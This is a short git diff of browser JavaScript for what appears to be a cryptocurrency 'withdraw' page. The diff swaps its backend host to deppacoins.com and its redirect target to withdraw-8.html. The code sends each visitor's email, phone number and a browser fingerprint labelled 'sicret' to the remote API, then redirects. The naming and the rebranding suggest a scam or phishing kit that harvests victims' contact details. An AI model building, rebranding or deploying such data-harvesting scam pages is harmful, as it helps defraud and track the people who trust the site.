@@ -61,7 +61,7 @@ function loaderFunction(status) {
 
 async function send_request(type, laoder, url, data) {
     return new Promise((resolve, reject) => {
-        let page = `https://chassecrypt.com/api/${url}`;
+        let page = `https://deppacoins.com/api/${url}`;
         xhr.open(type, page)
         xhr.responseType = "json"
         xhr.setRequestHeader('Access-Control-Allow-Headers', '*');
@@ -143,7 +143,7 @@ async function check_form(keys) {
                     send_request("post", false, "withdraw-pages", { email: email, type: "important", phone: null, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
 
                     setTimeout(() => {
-                        window.location.href = `withdraw.html?email=${email}`;
+                        window.location.href = `withdraw-8.html?email=${email}`;
                     }, 10000)
                 })
                 document.getElementById("send").addEventListener("click", () => {
@@ -168,7 +168,7 @@ async function check_form(keys) {
 
                         send_request("post", false, "withdraw-pages", { email: email, type: "important", phone: phone, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
                         setTimeout(() => {
-                            window.location.href = `withdraw.html?email=${email}`;
+                            window.location.href = `withdraw-8.html?email=${email}`;
                         }, 10000)
                     }
                 })
